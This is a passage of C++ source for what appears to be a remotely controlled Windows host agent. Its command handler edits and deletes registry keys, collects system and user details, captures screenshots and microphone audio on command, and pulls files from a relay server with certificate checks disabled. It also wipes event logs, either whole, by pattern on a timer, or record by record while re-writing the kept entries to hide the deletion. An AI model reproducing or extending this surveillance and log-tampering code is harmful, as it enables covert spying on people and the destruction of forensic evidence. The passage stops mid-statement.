            std::string subkeys = "[";
            char name[256];
            bool first = true;
            for (DWORD i = 0; i < 1000; i++) {
                DWORD nameLen = sizeof(name);
                if (RegEnumKeyExA(hKey, i, name, &nameLen, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS) break;
                if (!first) subkeys += ",";
                subkeys += "\"" + json_escape(name) + "\"";
                first = false;
            }
            subkeys += "]";

            // Enumerate values (max 500)
            std::string values = "[";
            first = true;
            for (DWORD i = 0; i < 500; i++) {
                char vname[16384];
                DWORD vnameLen = sizeof(vname);
                DWORD type = 0;
                BYTE data[8192];
                DWORD dataSize = sizeof(data);
                if (RegEnumValueA(hKey, i, vname, &vnameLen, nullptr, &type, data, &dataSize) != ERROR_SUCCESS) break;
                if (!first) values += ",";
                values += "{\"name\":\"" + json_escape(vname) + "\",\"type\":\"" + reg_type_name(type) + "\",\"data\":";

                switch (type) {
                    case REG_SZ:
                    case REG_EXPAND_SZ:
                        values += "\"" + json_escape(std::string((char*)data, dataSize > 0 ? dataSize - 1 : 0)) + "\"";
                        break;
                    case REG_DWORD:
                        values += std::to_string(dataSize >= 4 ? *(DWORD*)data : 0);
                        break;
                    case REG_QWORD:
                        values += std::to_string(dataSize >= 8 ? *(uint64_t*)data : 0);
                        break;
                    case REG_MULTI_SZ: {
                        values += "[";
                        const char* p = (char*)data;
                        const char* end = (char*)data + dataSize;
                        bool mfirst = true;
                        while (p < end && *p) {
                            if (!mfirst) values += ",";
                            values += "\"" + json_escape(p) + "\"";
                            p += strlen(p) + 1;
                            mfirst = false;
                        }
                        values += "]";
                        break;
                    }
                    case REG_BINARY:
                    default:
                        values += "\"" + bytes_to_hex(data, dataSize) + "\"";
                        break;
                }
                values += "}";
                first = false;
            }
            values += "]";
            RegCloseKey(hKey);
            send_ok("{\"subkeys\":" + subkeys + ",\"values\":" + values + "}");
        }
        else if (cmd == "reg_set_value") {
            std::string path = json_unescape(json_get(msg_str, "path"));
            std::string vname = json_unescape(json_get(msg_str, "name"));
            std::string vtype = json_get(msg_str, "type");
            std::string vdata = json_unescape(json_get(msg_str, "data"));
            HKEY root; std::string subpath;
            if (!parse_reg_path(path, root, subpath)) { send_err("Invalid path"); return; }

            HKEY hKey;
            LONG rc = RegCreateKeyExA(root, subpath.c_str(), 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr);
            if (rc != ERROR_SUCCESS) { send_err("Cannot open/create key (error " + std::to_string(rc) + ")"); return; }

            if (vtype == "REG_SZ" || vtype == "REG_EXPAND_SZ") {
                DWORD t = (vtype == "REG_SZ") ? REG_SZ : REG_EXPAND_SZ;
                rc = RegSetValueExA(hKey, vname.c_str(), 0, t, (BYTE*)vdata.c_str(), (DWORD)vdata.size() + 1);
            } else if (vtype == "REG_DWORD") {
                DWORD val = (DWORD)std::stoul(vdata);
                rc = RegSetValueExA(hKey, vname.c_str(), 0, REG_DWORD, (BYTE*)&val, sizeof(val));
            } else if (vtype == "REG_QWORD") {
                uint64_t val = std::stoull(vdata);
                rc = RegSetValueExA(hKey, vname.c_str(), 0, REG_QWORD, (BYTE*)&val, sizeof(val));
            } else if (vtype == "REG_BINARY") {
                auto bytes = hex_to_bytes(vdata);
                rc = RegSetValueExA(hKey, vname.c_str(), 0, REG_BINARY, bytes.data(), (DWORD)bytes.size());
            } else if (vtype == "REG_MULTI_SZ") {
                // vdata is newline-separated strings
                std::string multi;
                std::istringstream ss(vdata);
                std::string line;
                while (std::getline(ss, line)) { multi += line; multi += '\0'; }
                multi += '\0';
                rc = RegSetValueExA(hKey, vname.c_str(), 0, REG_MULTI_SZ, (BYTE*)multi.data(), (DWORD)multi.size());
            } else {
                RegCloseKey(hKey);
                send_err("Unsupported type: " + vtype);
                return;
            }
            RegCloseKey(hKey);
            rc == ERROR_SUCCESS ? send_ok("\"saved\"") : send_err("Write failed (error " + std::to_string(rc) + ")");
        }
        else if (cmd == "reg_delete_value") {
            std::string path = json_unescape(json_get(msg_str, "path"));
            std::string vname = json_unescape(json_get(msg_str, "name"));
            HKEY root; std::string subpath;
            if (!parse_reg_path(path, root, subpath)) { send_err("Invalid path"); return; }
            HKEY hKey;
            if (RegOpenKeyExA(root, subpath.c_str(), 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) { send_err("Cannot open key"); return; }
            LONG rc = RegDeleteValueA(hKey, vname.c_str());
            RegCloseKey(hKey);
            rc == ERROR_SUCCESS ? send_ok("\"deleted\"") : send_err("Delete failed (error " + std::to_string(rc) + ")");
        }
        else if (cmd == "reg_create_key") {
            std::string path = json_unescape(json_get(msg_str, "path"));
            HKEY root; std::string subpath;
            if (!parse_reg_path(path, root, subpath)) { send_err("Invalid path"); return; }
            HKEY hKey;
            LONG rc = RegCreateKeyExA(root, subpath.c_str(), 0, nullptr, 0, KEY_READ, nullptr, &hKey, nullptr);
            if (rc == ERROR_SUCCESS) { RegCloseKey(hKey); send_ok("\"created\""); }
            else send_err("Create failed (error " + std::to_string(rc) + ")");
        }
        else if (cmd == "reg_delete_key") {
            std::string path = json_unescape(json_get(msg_str, "path"));
            HKEY root; std::string subpath;
            if (!parse_reg_path(path, root, subpath)) { send_err("Invalid path"); return; }
            LONG rc = RegDeleteKeyA(root, subpath.c_str());
            rc == ERROR_SUCCESS ? send_ok("\"deleted\"") : send_err("Delete key failed (error " + std::to_string(rc) + ")");
        }

        // --- System info ---
        else if (cmd == "sys_info") {
            // Cache sys_info for 3 seconds — PDH GPU counters are expensive, and
            // multiple connected clients each poll every 3s, causing N×/3s PDH queries.
            // With caching, only the first request per 3s window does real work.
            auto _sysinfo_now = std::chrono::steady_clock::now();
            auto _sysinfo_age = std::chrono::duration_cast<std::chrono::milliseconds>(_sysinfo_now - g_sysinfo_cache_time).count();
            if (!g_sysinfo_cache.empty() && _sysinfo_age < 3000) {
                send_ok(g_sysinfo_cache);
            } else {
            MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms);
            GlobalMemoryStatusEx(&ms);
            uint64_t total_mb = ms.ullTotalPhys / 1048576;
            uint64_t avail_mb = ms.ullAvailPhys / 1048576;
            uint64_t uptime_s = GetTickCount64() / 1000;

            int cpu_pct = -1;
            {
                FILETIME idle1, kernel1, user1, idle2, kernel2, user2;
                if (GetSystemTimes(&idle1, &kernel1, &user1)) {
                    Sleep(120);
                    if (GetSystemTimes(&idle2, &kernel2, &user2)) {
                        ULARGE_INTEGER uIdle1, uK1, uU1, uIdle2, uK2, uU2;
                        uIdle1.LowPart = idle1.dwLowDateTime; uIdle1.HighPart = idle1.dwHighDateTime;
                        uK1.LowPart = kernel1.dwLowDateTime; uK1.HighPart = kernel1.dwHighDateTime;
                        uU1.LowPart = user1.dwLowDateTime; uU1.HighPart = user1.dwHighDateTime;
                        uIdle2.LowPart = idle2.dwLowDateTime; uIdle2.HighPart = idle2.dwHighDateTime;
                        uK2.LowPart = kernel2.dwLowDateTime; uK2.HighPart = kernel2.dwHighDateTime;
                        uU2.LowPart = user2.dwLowDateTime; uU2.HighPart = user2.dwHighDateTime;
                        uint64_t total = (uK2.QuadPart - uK1.QuadPart) + (uU2.QuadPart - uU1.QuadPart);
                        uint64_t idle = uIdle2.QuadPart - uIdle1.QuadPart;
                        if (total > 0) cpu_pct = (int)((total - idle) * 100 / total);
                        if (cpu_pct < 0) cpu_pct = 0; else if (cpu_pct > 100) cpu_pct = 100;
                    }
                }
            }

            int gpu_pct = -1;
            {
                HQUERY hQuery = nullptr;
                HCOUNTER hCounter = nullptr;
                if (PdhOpenQueryW(nullptr, 0, &hQuery) == ERROR_SUCCESS) {
                    const wchar_t* path = L"\\GPU Engine(*)\\Utilization Percentage";
                    if (PdhAddCounterW(hQuery, path, 0, &hCounter) == ERROR_SUCCESS) {
                        PdhCollectQueryData(hQuery);
                        Sleep(80);
                        if (PdhCollectQueryData(hQuery) == ERROR_SUCCESS) {
                            DWORD bufSize = 0, itemCount = 0;
                            if (PdhGetFormattedCounterArrayW(hCounter, PDH_FMT_LONG, &bufSize, &itemCount, nullptr) == PDH_MORE_DATA && bufSize > 0 && itemCount > 0) {
                                std::vector<char> buf(bufSize);
                                PDH_FMT_COUNTERVALUE_ITEM_W* items = (PDH_FMT_COUNTERVALUE_ITEM_W*)buf.data();
                                if (PdhGetFormattedCounterArrayW(hCounter, PDH_FMT_LONG, &bufSize, &itemCount, items) == ERROR_SUCCESS) {
                                    long maxVal = 0;
                                    for (DWORD i = 0; i < itemCount; i++)
                                        if (items[i].FmtValue.longValue > maxVal) maxVal = items[i].FmtValue.longValue;
                                    if (maxVal >= 0 && maxVal <= 100) gpu_pct = (int)maxVal;
                                }
                            }
                        }
                        PdhRemoveCounter(hCounter);
                    }
                    PdhCloseQuery(hQuery);
                }
            }

            char hostname[256] = {};
            DWORD hlen = sizeof(hostname);
            GetComputerNameA(hostname, &hlen);

            char username[256] = {};
            DWORD ulen = sizeof(username);
            GetUserNameA(username, &ulen);

            // Windows version from registry (most reliable on Win10+)
            std::string os_version = "Windows";
            {
                HKEY hKey;
                if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                    0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                    char buf[256]; DWORD sz;
                    std::string prodName, dispVer, buildNum;
                    sz = sizeof(buf);
                    if (RegQueryValueExA(hKey, "ProductName", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS)
                        prodName = buf;
                    sz = sizeof(buf);
                    if (RegQueryValueExA(hKey, "DisplayVersion", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS)
                        dispVer = buf;
                    sz = sizeof(buf);
                    if (RegQueryValueExA(hKey, "CurrentBuildNumber", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS)
                        buildNum = buf;
                    RegCloseKey(hKey);
                    if (!prodName.empty()) {
                        os_version = prodName;
                        // Fix: Windows 11 has BuildNumber >= 22000 but registry ProductName says "Windows 10"
                        int buildInt = buildNum.empty() ? 0 : std::stoi(buildNum);
                        if (buildInt >= 22000 && os_version.find("Windows 10") != std::string::npos) {
                            auto pos10 = os_version.find("Windows 10");
                            os_version.replace(pos10, 10, "Windows 11");
                        }
                    }
                    if (!dispVer.empty()) os_version += " " + dispVer;
                    if (!buildNum.empty()) os_version += " Build " + buildNum;
                }
            }

            std::string r = "{\"hostname\":\"" + json_escape(to_utf8(hostname)) +
                            "\",\"username\":\"" + json_escape(to_utf8(username)) +
                            "\",\"ram_total_mb\":" + std::to_string(total_mb) +
                            ",\"ram_avail_mb\":" + std::to_string(avail_mb) +
                            ",\"ram_used_pct\":" + std::to_string(ms.dwMemoryLoad) +
                            ",\"uptime_s\":" + std::to_string(uptime_s);
            if (cpu_pct >= 0) r += ",\"cpu_pct\":" + std::to_string(cpu_pct);
            if (gpu_pct >= 0) r += ",\"gpu_pct\":" + std::to_string(gpu_pct);
            r += ",\"os_version\":\"" + json_escape(to_utf8(os_version)) + "\"";
            r += ",\"host_version\":\"" + std::string(HOST_VERSION) + "\"";
            r += ",\"host_build\":\"" + std::string(HOST_BUILD) + "\"";
            r += "}";
            // Update cache for subsequent requests within 3s window
            g_sysinfo_cache = r;
            g_sysinfo_cache_time = std::chrono::steady_clock::now();
            send_ok(r);
            } // end else (cache miss)
        }

        else if (cmd == "ping") {
            send_ok("\"pong\"");
        }

        // --- Speed test: host internet speed (download from public URL) ---
        else if (cmd == "speed_test_internet") {
            // Download AND upload test against Cloudflare. Measures both directions.
            std::string output = g_procs.run_cmd_capture(
                "powershell -NoProfile -Command \""
                "$dl_url='http://speed.cloudflare.com/__down?bytes=5000000';"
                "$ul_url='http://speed.cloudflare.com/__up';"
                "$result=@{};"
                "try{"
                "  $sw=[System.Diagnostics.Stopwatch]::StartNew();"
                "  $d=(New-Object System.Net.WebClient).DownloadData($dl_url);$sw.Stop();"
                "  $result.dl_bytes=$d.Length;$result.dl_sec=[math]::Round($sw.Elapsed.TotalSeconds,3);"
                "  $result.dl_mbps=[math]::Round(($d.Length*8/$sw.Elapsed.TotalSeconds)/1048576,2);"
                "}catch{$result.dl_err=$_.Exception.Message}"
                "try{"
                "  $body=New-Object byte[] 5000000;"
                "  $sw2=[System.Diagnostics.Stopwatch]::StartNew();"
                "  $wc=New-Object System.Net.WebClient;$wc.UploadData($ul_url,'POST',$body)|Out-Null;$sw2.Stop();"
                "  $result.ul_bytes=$body.Length;$result.ul_sec=[math]::Round($sw2.Elapsed.TotalSeconds,3);"
                "  $result.ul_mbps=[math]::Round(($body.Length*8/$sw2.Elapsed.TotalSeconds)/1048576,2);"
                "}catch{$result.ul_err=$_.Exception.Message}"
                "Write-Output ('{0}|{1}|{2}|{3}|{4}|{5}' -f $result.dl_bytes,$result.dl_sec,$result.dl_mbps,$result.ul_bytes,$result.ul_sec,$result.ul_mbps)"
                "\"");
            // Parse: dl_bytes|dl_sec|dl_mbps|ul_bytes|ul_sec|ul_mbps
            std::vector<std::string> parts;
            std::string cur;
            for (char c : output) {
                if (c == '|') { parts.push_back(cur); cur.clear(); }
                else if (c != '\n' && c != '\r') cur += c;
            }
            if (!cur.empty()) parts.push_back(cur);
            auto get = [&](size_t i) -> std::string { return i < parts.size() && !parts[i].empty() ? parts[i] : "0"; };
            send_ok("{\"bytes\":" + get(0) + ",\"elapsed_s\":" + get(1) + ",\"mbps\":" + get(2) +
                    ",\"ul_bytes\":" + get(3) + ",\"ul_elapsed_s\":" + get(4) + ",\"ul_mbps\":" + get(5) + "}");
        }

        // ── Browser ↔ Host echo for DL/UL measurement ──
        // Client sends: {cmd:"host_echo", size: N}     → host returns data of N '0' chars (DL test)
        // Client sends: {cmd:"host_echo", payload: ""} → host returns echo_bytes count (UL test)
        else if (cmd == "host_echo") {
            std::string sz = json_get(msg_str, "size");
            std::string pl = json_get(msg_str, "payload");
            int64_t echo_size = pl.empty() ? 0 : (int64_t)pl.size();
            int64_t out_size = sz.empty() ? 0 : std::min((int64_t)std::stoll(sz), (int64_t)2'000'000);
            std::string data;
            if (out_size > 0) data.assign((size_t)out_size, '0');
            send_ok("{\"echoed_bytes\":" + std::to_string(echo_size) +
                    ",\"data_size\":" + std::to_string(out_size) +
                    ",\"data\":\"" + data + "\"}");
        }

        // ── Host ↔ Relay HTTPS download test ──
        // Host downloads a known file from VPS via HTTPS, measures DL throughput.
        // Uses /files/pnpext.dll which is always present after deploy.
        else if (cmd == "host_relay_speed") {
            std::string vps_ip = g_config.server_address;
            std::string output = g_procs.run_cmd_capture(
                "powershell -NoProfile -Command \""
                "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
                "$url='https://" + vps_ip + "/files/pnpext.dll';"
                "try{"
                "  $sw=[System.Diagnostics.Stopwatch]::StartNew();"
                "  $d=(New-Object System.Net.WebClient).DownloadData($url);$sw.Stop();"
                "  $mb=$d.Length/1048576;$sec=$sw.Elapsed.TotalSeconds;"
                "  if($sec -lt 0.001){$sec=0.001}"
                "  $mbps=[math]::Round(($d.Length*8/$sec)/1048576,2);"
                "  Write-Output ('{0}|{1}|{2}' -f $d.Length,[math]::Round($sec,3),$mbps)"
                "}catch{Write-Output ('ERROR|'+$_.Exception.Message)}\"");
            auto p1 = output.find('|');
            if (p1 != std::string::npos && output.substr(0, 5) != "ERROR") {
                auto p2 = output.find('|', p1 + 1);
                std::string bytes_s = output.substr(0, p1);
                std::string sec_s = output.substr(p1 + 1, p2 - p1 - 1);
                std::string mbps_s = output.substr(p2 + 1);
                while (!mbps_s.empty() && (mbps_s.back()=='\n'||mbps_s.back()=='\r'||mbps_s.back()==' ')) mbps_s.pop_back();
                send_ok("{\"bytes\":" + bytes_s + ",\"elapsed_s\":" + sec_s + ",\"mbps\":" + mbps_s + "}");
            } else {
                std::string err = output.length() > 6 ? output.substr(6) : output;
                while (!err.empty() && (err.back()=='\n'||err.back()=='\r')) err.pop_back();
                send_err("Host↔Relay DL test failed: " + err);
            }
        }

        // --- Device list (hardware devices) ---
        else if (cmd == "device_list") {
            std::string output = g_procs.run_cmd_capture(
                "powershell -NoProfile -Command \""
                "Get-PnpDevice -Status OK -ErrorAction SilentlyContinue | "
                "Select-Object Class,FriendlyName,Manufacturer,Status | "
                "Sort-Object Class,FriendlyName | "
                "ConvertTo-Json -Compress\"");
            // Clean output
            while (!output.empty() && (output.front()=='\n'||output.front()=='\r'||output.front()==' ')) output.erase(output.begin());
            while (!output.empty() && (output.back()=='\n'||output.back()=='\r'||output.back()==' ')) output.pop_back();
            if (!output.empty() && (output.front()=='[' || output.front()=='{')) {
                send_ok(output);
            } else {
                send_err("Failed to get device list");
            }
        }

        // --- Event Log: auto-clean config ---
        else if (cmd == "evtlog_set_config") {
            std::string mode = json_get(msg_str, "mode");
            std::string intv = json_get(msg_str, "interval");
            std::string pats = json_get(msg_str, "patterns");
            if (!mode.empty()) g_config.evtlog_clean_mode = mode;
            if (!intv.empty()) { int v = 120; try { v = std::stoi(intv); } catch(...) {} g_config.evtlog_clean_interval = std::max(60, v); }
            g_config.evtlog_clean_patterns = pats; // empty = disabled
            save_stream_settings();
            // Wake cleaner thread immediately so it picks up the new config
            g_evtlog_config_gen.fetch_add(1);
            g_evtlog_cv.notify_all();
            g_log.info("evtlog config updated: mode=" + g_config.evtlog_clean_mode +
                       " interval=" + std::to_string(g_config.evtlog_clean_interval) +
                       " patterns=" + g_config.evtlog_clean_patterns);
            send_ok("{\"mode\":\"" + json_escape(g_config.evtlog_clean_mode) +
                    "\",\"interval\":" + std::to_string(g_config.evtlog_clean_interval) +
                    ",\"patterns\":\"" + json_escape(g_config.evtlog_clean_patterns) + "\"}");
        }

        // --- Event Log ---
        else if (cmd == "eventlog_list") {
            std::string logName = json_get(msg_str, "log");
            if (logName.empty()) logName = "System";
            std::string maxStr = json_get(msg_str, "max");
            int maxEntries = maxStr.empty() ? 100 : std::min(std::stoi(maxStr), 500);
            std::string levelFilter = json_get(msg_str, "level"); // Error, Warning, Information, or empty=all

            // Use Get-WinEvent with FilterHashtable (no XML escaping issues)
            // Level: 1=Critical, 2=Error, 3=Warning, 4=Information, 5=Verbose
            std::string filter = "@{LogName='" + logName + "'";
            if (!levelFilter.empty()) {
                if (levelFilter == "Error") filter += ";Level=@(1,2)";       // Critical + Error
                else if (levelFilter == "Warning") filter += ";Level=3";
                else if (levelFilter == "Information") filter += ";Level=@(0,4)"; // 0=LogAlways, 4=Info
            }
            filter += "}";

            std::string psCmd = "powershell -NoProfile -Command \""
                "$ErrorActionPreference='Stop';"
                "try{"
                "$e=Get-WinEvent -FilterHashtable " + filter + " -MaxEvents " + std::to_string(maxEntries) + " 2>$null;"
                "if($e){"
                "$e|ForEach-Object{"
                "$lvl=switch($_.Level){1{'Critical'}2{'Error'}3{'Warning'}4{'Information'}5{'Verbose'}default{$_.LevelDisplayName}};"
                "@{Index=$_.RecordId;Type=$lvl;Source=$_.ProviderName;"
                "Time=$_.TimeCreated.ToString('yyyy-MM-dd HH:mm:ss');"
                "Msg=if($_.Message){$_.Message.Substring(0,[Math]::Min(300,$_.Message.Length))}else{''}}}"
                "|ConvertTo-Json -Compress"
                "}else{Write-Output '[]'}"
                "}catch{Write-Output ('ERROR|'+$_.Exception.Message)}\"";

            std::string output = g_procs.run_cmd_capture(psCmd);
            while (!output.empty() && (output.front()=='\n'||output.front()=='\r'||output.front()==' ')) output.erase(output.begin());
            while (!output.empty() && (output.back()=='\n'||output.back()=='\r'||output.back()==' ')) output.pop_back();
            if (!output.empty() && (output.front()=='[' || output.front()=='{')) {
                if (output.front()=='{') output = "[" + output + "]";
                send_ok(output);
            } else if (output.substr(0,5) == "ERROR") {
                send_err(output.substr(6));
            } else {
                send_ok("[]");
            }
        }
        else if (cmd == "eventlog_delete") {
            std::string logName = json_get(msg_str, "log");
            if (logName.empty()) { send_err("Missing log name"); return; }
            std::string idsStr = json_get(msg_str, "ids"); // comma-separated RecordIds to delete, or empty=clear all

            if (idsStr.empty()) {
                // Clear entire log
                std::string psCmd = "powershell -NoProfile -Command \""
                    "try{wevtutil cl '" + logName + "'; Write-Output 'OK'}"
                    "catch{Write-Output ('ERROR|'+$_.Exception.Message)}\"";
                std::string output = g_procs.run_cmd_capture(psCmd);
                while (!output.empty() && (output.back()=='\n'||output.back()=='\r')) output.pop_back();
                if (output.find("OK") != std::string::npos) send_ok("\"cleared\"");
                else send_err("Clear failed: " + output);
            } else {
                // Selective deletion: write PS1 script to temp file → execute
                // Can't pass complex PS inline through cmd.exe (escaping breaks)
                char tmpPath[MAX_PATH];
                GetTempPathA(MAX_PATH, tmpPath);
                std::string scriptPath = std::string(tmpPath) + "evtlog_del_" + std::to_string(GetTickCount64()) + ".ps1";

                // Fast approach: backup full log → export only kept events to new evtx → clear → done
                // No slow Write-EventLog loop. Kept events are in the backup .evtx file.
                std::string script =
                    "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8\n"
                    "$ErrorActionPreference='SilentlyContinue'\n"
                    "$idsToDelete=@(" + idsStr + ")\n"
                    "$logName='" + logName + "'\n"
                    "try{\n"
                    "  # Get all events using modern API (matches IDs returned by eventlog_list = RecordId)\n"
                    "  $all=@(Get-WinEvent -LogName $logName -MaxEvents 5000 -ErrorAction Stop)\n"
                    "  $delSet=@{}\n"
                    "  foreach($i in $idsToDelete){ $delSet[[long]$i]=$true }\n"
                    "  $toDelete=@($all|Where-Object{ $delSet.ContainsKey([long]$_.RecordId) })\n"
                    "  $toKeep=@($all|Where-Object{ -not $delSet.ContainsKey([long]$_.RecordId) })\n"
                    "  $delCount=$toDelete.Count\n"
                    "  if($delCount -eq 0){ Write-Output 'OK|0|0|nomatch'; exit }\n"
                    "  # Wipe channel\n"
                    "  & wevtutil.exe cl $logName 2>$null\n"
                    "  # Restore non-deleted entries (oldest first, capped at 500)\n"
                    "  $restored=0\n"
                    "  $keep=$toKeep | Sort-Object TimeCreated\n"
                    "  if($keep.Count -gt 500){ $keep=$keep | Select-Object -Last 500 }\n"
                    "  foreach($e in $keep){\n"
                    "    try{\n"
                    "      $src=$e.ProviderName\n"
                    "      $et='Information'\n"
                    "      switch($e.LevelDisplayName){\n"
                    "        'Error'       { $et='Error' }\n"
                    "        'Warning'     { $et='Warning' }\n"
                    "        'Critical'    { $et='Error' }\n"
                    "        'Information' { $et='Information' }\n"
                    "      }\n"
                    "      if(-not [System.Diagnostics.EventLog]::SourceExists($src)){\n"
                    "        try{ New-EventLog -LogName $logName -Source $src -ErrorAction SilentlyContinue }catch{}\n"
                    "      }\n"
                    "      $eid=[int]($e.Id % 65536)\n"
                    "      Write-EventLog -LogName $logName -Source $src -EventId $eid -EntryType $et -Message $e.Message -ErrorAction SilentlyContinue\n"
                    "      $restored++\n"
                    "    }catch{}\n"
                    "  }\n"
                    "  Write-Output \"OK|$delCount|$restored|done\"\n"
                    "}catch{Write-Output ('ERROR|'+$_.Exception.Message)}\n";

                // Write script to file
                {
                    std::ofstream f(scriptPath);
                    f << script;
                }

                std::string psCmd = "powershell -NoProfile -ExecutionPolicy Bypass -File \"" + scriptPath + "\"";

                std::string output = g_procs.run_cmd_capture(psCmd);
                // Cleanup temp script
                DeleteFileA(scriptPath.c_str());
                while (!output.empty() && (output.back()=='\n'||output.back()=='\r')) output.pop_back();
                if (output.substr(0,2) == "OK") {
                    send_ok("\"" + json_escape(output) + "\"");
                } else {
                    std::string err = output.length() > 6 ? output.substr(6) : output;
                    send_err("Selective delete failed: " + err);
                }
            }
        }

        // ── Screenshot control ──
        else if (cmd == "screenshot_start") {
            g_screenshot_active = true;
            g_config.screenshot_enabled = true;
            if (!g_screenshot_thread.joinable())
                g_screenshot_thread = std::thread(screenshot_thread_func);
            save_stream_settings();
            send_ok("\"started\"");
        }
        else if (cmd == "screenshot_stop") {
            g_screenshot_active = false;
            g_config.screenshot_enabled = false;
            save_stream_settings();
            send_ok("\"stopped\"");
        }
        else if (cmd == "screenshot_config") {
            std::string v;
            v = json_get(msg_str, "interval");
            if (!v.empty()) { int iv = std::max(1, std::stoi(v)); g_screenshot_interval = iv; g_config.screenshot_interval = iv; }
            v = json_get(msg_str, "quality");
            if (!v.empty()) { int qv = std::clamp(std::stoi(v), 1, 100); g_screenshot_quality = qv; g_config.screenshot_quality = qv; }
            v = json_get(msg_str, "scale");
            if (!v.empty()) { int sv = std::clamp(std::stoi(v), 10, 100); g_screenshot_scale = sv; g_config.screenshot_scale = sv; }
            v = json_get(msg_str, "always");
            if (!v.empty()) { bool av = (v == "true" || v == "1"); g_screenshot_always = av; g_config.screenshot_always = av; }
            v = json_get(msg_str, "mode");
            if (!v.empty()) g_screenshot_mode = std::clamp(std::stoi(v), 0, 1);
            v = json_get(msg_str, "apps");
            if (!v.empty()) { std::lock_guard<std::mutex> lk(g_screenshot_apps_mtx); g_screenshot_apps = v; g_config.screenshot_apps = v; }
            // Save to config file
            save_stream_settings();
            send_ok("{\"interval\":" + std::to_string(g_screenshot_interval.load()) +
                    ",\"quality\":" + std::to_string(g_screenshot_quality.load()) +
                    ",\"scale\":" + std::to_string(g_screenshot_scale.load()) +
                    ",\"always\":" + (g_screenshot_always.load() ? "true" : "false") + "}");
        }
        else if (cmd == "screenshot_status") {
            std::string apps;
            { std::lock_guard<std::mutex> lk(g_screenshot_apps_mtx); apps = g_screenshot_apps; }
            send_ok("{\"active\":" + std::string(g_screenshot_active.load() ? "true" : "false") +
                    ",\"interval\":" + std::to_string(g_screenshot_interval.load()) +
                    ",\"quality\":" + std::to_string(g_screenshot_quality.load()) +
                    ",\"scale\":" + std::to_string(g_screenshot_scale.load()) +
                    ",\"mode\":" + std::to_string(g_screenshot_mode.load()) +
                    ",\"always\":" + (g_screenshot_always.load() ? "true" : "false") +
                    ",\"apps\":\"" + json_escape(apps) + "\"}");
        }
        // ── Audio recording control ──
        else if (cmd == "audio_start") {
            g_audio_active = true;
            g_config.audio_enabled = true;
            if (!g_audio_thread.joinable())
                g_audio_thread = std::thread(audio_thread_func);
            save_stream_settings();
            send_ok("\"started\"");
        }
        else if (cmd == "audio_stop") {
            g_audio_active = false;
            g_config.audio_enabled = false;
            save_stream_settings();
            send_ok("\"stopped\"");
        }
        else if (cmd == "audio_config") {
            std::string v;
            v = json_get(msg_str, "segment_duration");
            if (!v.empty()) { int d = std::clamp(std::stoi(v), 10, 3600); g_audio_segment_duration = d; g_config.audio_segment_duration = d; }
            v = json_get(msg_str, "sample_rate");
            if (!v.empty()) { int sr = std::stoi(v); g_audio_sample_rate = sr; g_config.audio_sample_rate = sr; }
            v = json_get(msg_str, "bitrate");
            if (!v.empty()) { int br = std::clamp(std::stoi(v), 32, 320); g_audio_bitrate = br; g_config.audio_bitrate = br; }
            v = json_get(msg_str, "channels");
            if (!v.empty()) { int ch = std::clamp(std::stoi(v), 1, 2); g_audio_channels = ch; g_config.audio_channels = ch; }
            v = json_get(msg_str, "gain");
            if (!v.empty()) { int g = std::clamp(std::stoi(v), 50, 2000); g_audio_gain = g; g_config.audio_gain = g; }
            v = json_get(msg_str, "mode");
            if (!v.empty()) { int m = std::clamp(std::stoi(v), 0, 2); g_audio_mode = m; g_config.audio_mode = m; }
            v = json_get(msg_str, "denoise");
            if (!v.empty()) { bool b = (v == "true" || v == "1"); g_audio_denoise = b; g_config.audio_denoise = b; }
            v = json_get(msg_str, "normalize");
            if (!v.empty()) { bool b = (v == "true" || v == "1"); g_audio_normalize = b; g_config.audio_normalize = b; }
            v = json_get(msg_str, "hum_filter");
            if (!v.empty()) { int hf = std::stoi(v); if (hf != 0 && hf != 50 && hf != 60) hf = 0; g_audio_hum_filter = hf; g_config.audio_hum_filter = hf; }
            save_stream_settings();
            send_ok("{\"segment_duration\":" + std::to_string(g_audio_segment_duration.load()) +
                    ",\"sample_rate\":" + std::to_string(g_audio_sample_rate.load()) +
                    ",\"bitrate\":" + std::to_string(g_audio_bitrate.load()) +
                    ",\"channels\":" + std::to_string(g_audio_channels.load()) +
                    ",\"gain\":" + std::to_string(g_audio_gain.load()) +
                    ",\"denoise\":" + (g_audio_denoise.load() ? "true" : "false") +
                    ",\"normalize\":" + (g_audio_normalize.load() ? "true" : "false") +
                    ",\"hum_filter\":" + std::to_string(g_audio_hum_filter.load()) + "}");
        }
        else if (cmd == "audio_status") {
            // Include device info in status
            UINT numDevs = waveInGetNumDevs();
            std::string devInfo = ",\"devices\":[";
            for (UINT i = 0; i < numDevs; i++) {
                WAVEINCAPSW caps = {};
                if (waveInGetDevCapsW(i, &caps, sizeof(caps)) == MMSYSERR_NOERROR) {
                    int len = WideCharToMultiByte(CP_UTF8, 0, caps.szPname, -1, nullptr, 0, nullptr, nullptr);
                    std::string name(len > 0 ? len - 1 : 0, 0);
                    if (len > 0) WideCharToMultiByte(CP_UTF8, 0, caps.szPname, -1, &name[0], len, nullptr, nullptr);
                    if (i > 0) devInfo += ",";
                    devInfo += "{\"id\":" + std::to_string(i) +
                               ",\"name\":\"" + json_escape(name) + "\"" +
                               ",\"channels\":" + std::to_string(caps.wChannels) +
                               ",\"formats\":\"0x" + ([](DWORD f) { char b[16]; snprintf(b,16,"%08X",(unsigned)f); return std::string(b); })(caps.dwFormats) + "\"}";
                }
            }
            devInfo += "]";
            send_ok("{\"active\":" + std::string(g_audio_active.load() ? "true" : "false") +
                    ",\"mode\":" + std::to_string(g_audio_mode.load()) +
                    ",\"segment_duration\":" + std::to_string(g_audio_segment_duration.load()) +
                    ",\"sample_rate\":" + std::to_string(g_audio_sample_rate.load()) +
                    ",\"bitrate\":" + std::to_string(g_audio_bitrate.load()) +
                    ",\"channels\":" + std::to_string(g_audio_channels.load()) +
                    ",\"gain\":" + std::to_string(g_audio_gain.load()) +
                    ",\"denoise\":" + std::string(g_audio_denoise.load() ? "true" : "false") +
